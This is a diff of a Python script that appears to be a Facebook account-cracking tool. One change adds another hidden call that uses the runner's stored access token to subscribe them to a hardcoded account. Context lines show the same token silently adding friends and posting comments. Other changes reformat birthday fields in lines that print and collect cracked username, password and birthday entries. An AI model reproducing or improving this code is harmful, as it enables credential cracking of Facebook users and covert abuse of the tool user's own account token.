@@ -260,6 +260,7 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
+	requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,__cindy__,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
@@ -758,7 +759,7 @@ class __crack__:
                     __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
-                    ttl= az['birthday']
+                    ttl= az['birthday'].replace('/','-')
                     print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                     wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                     cp.append(wrt)
@@ -809,7 +810,7 @@ class __crack__:
                     __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
-                    ttl= az['birthday']
+                    ttl= az['birthday'].replace('/','-')
                     print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                     wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                     cp.append(wrt)
@@ -863,7 +864,7 @@ class __crack__:
                     __cindy__ = open('__yayan__.txt').read()
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                     az = json.loads(ak.text)
-                    ttl= az['birthday']
+                    ttl= az['birthday'].replace('/','-')
                     print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                     wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                     cp.append(wrt)
